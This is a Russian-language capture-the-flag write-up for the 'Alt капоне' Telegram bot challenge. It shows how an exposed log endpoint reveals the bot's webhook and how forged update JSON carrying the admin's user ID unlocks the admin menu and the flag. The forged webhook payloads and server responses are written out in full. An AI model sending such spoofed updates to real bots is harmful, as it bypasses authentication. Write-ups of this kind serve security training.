# Alt капоне

Итальянский мафиози рассылает всем через мессенджер предложение, от которого нельзя отказаться. Взломайте предложение, чтобы в нём появилась кнопка «Отказаться».

Доступ к боту: [**t.me/italyamafiabot**](https://t.me/italyamafiabot)

### Решение:

Чат-бот имеет только 2 кнопки да и админ

Выдает ссылку на картинку, смотрим только ее корень

![Untitled](Untitled%2012.png)

В берпе меняем метод get на post, видим рекомендацию запроса

![Untitled](Untitled%2013.png)

[@bash_dev](https://t.me/bash_dev)

Имею 2 команды,
/start - Дает меню с одной кнопкой "Да"
/admin - "Меню администратора доступно только [@exmafiaguy](https://t.me/exmafiaguy)

Открыл данные сообщений, увидел там url картинки из ответа к /start:

[https://t-altcapone-r1m0mt9a.spbctf.net/images/mafia.webp](https://t-altcapone-r1m0mt9a.spbctf.net/images/mafia.webp)

Перешел по нему, он показал варианты действий:
GET

[https://t-altcapone-r1m0mt9a.spbctf.net/](https://t-altcapone-r1m0mt9a.spbctf.net/)

Use: ?action=<show_nginx_logs|start_ping>

Перешел по [https://t-altcapone-r1m0mt9a.spbctf.net/?action=show_nginx_logs](https://t-altcapone-r1m0mt9a.spbctf.net/?action=show_nginx_logs) , увидел в логах "POST /telegram/webhook", понял то что работает он на вебхуках

![Untitled](Untitled%2014.png)

Посмотрел id пользователя [@exmafiaguy](https://t.me/exmafiaguy) - 6818118044, Отправляю запросы на [https://t-altcapone-r1m0mt9a.spbctf.net/telegram/webhook](https://t-altcapone-r1m0mt9a.spbctf.net/telegram/webhook)
Первый с  такими данными, чтобы увидеть что там есть в админке:

![Untitled](e895d00c-a72e-439b-912b-16b96c4b04fc.png)

```json
{
    "message": {
        "from": {
            "id": 6818118044,
            "first_name": "RasaSporT",
            "username": "bash_dev"
        },
        "text": "/admin"
    }
}

```

![Untitled](fd8a8f4c-412c-4a3d-a5c9-d0d131f176a5.png)

```json
{
    "chat_id": 6818118044,
    "text": "Выберите действие",
    "reply_markup": {
        "inline_keyboard": [
            [{
                    "text": "Перезагрузить nginx",
                    "callback_data": "inline_button_restartnginx"
            }],
            [{
                    "text": "Атаковать example.org",
                    "callback_data": "inline_button_ddosexample"
            }],
            [{
                    "text": "Пинговать google.com",
                    "callback_data": "inline_button_pinggoogle"
            }],
            [{
                    "text": "Другие >>",
                    "callback_data": "inline_button_nextpage"
            }]
        ]
    },
    "method": "sendMessage"
}
```

Вижу что ничего нужного нет, шлю на следующую страницу,

```json
{
    "callback_query": {
        "from": {
            "id": 6818118044,
            "first_name": "RasaSporT",
            "username": "bash_dev"
        },
        "data": "inline_button_nextpage"
    }
}
```

Получаю то что искал,

```json
{
    "chat_id": 6818118044,
    "text": "Выберите действие",
    "reply_markup": {
        "inline_keyboard": [
            [{
                    "text": "Отправить приглашение",
                    "callback_data": "inline_button_sendinvite"
            }]
        ]
    },
    "method": "sendMessage"
}

```

Отправляю приглашение:

```json
{
    "callback_query": {
        "from": {
            "id": 6818118044,
            "first_name": "RasaSporT",
            "username": "bash_dev"
        },
        "data": "inline_button_sendinvite"
    }
}
```

Просит отправить id пользователя которому нужно отправить приглашение с возможностью отмены:

```json
{
    "chat_id": 6818118044,
    "text": "В следующие 10 секунд напишите ID чата, куда отправить приглашение",
    "method": "sendMessage"
}
```

Отправляю...

```json
{
    "message": {
        "from": {
            "id": 6818118044,
            "first_name": "RasaSporT",
            "username": "bash_dev"
        },
        "text": "800863363"
    }
}
```

Ответ:

```json
{
    "chat_id": 6818118044,
    "text": "Успешно отправили приглашение.",
    "method": "sendMessage"
}
```

И мне в телеграмм приходит сообщение от бота, такое же как ответ на /start, но с кнопкой "Нет")   После нажатия кнопки "Нет" получаю флаг))

![Untitled](Untitled%2015.png)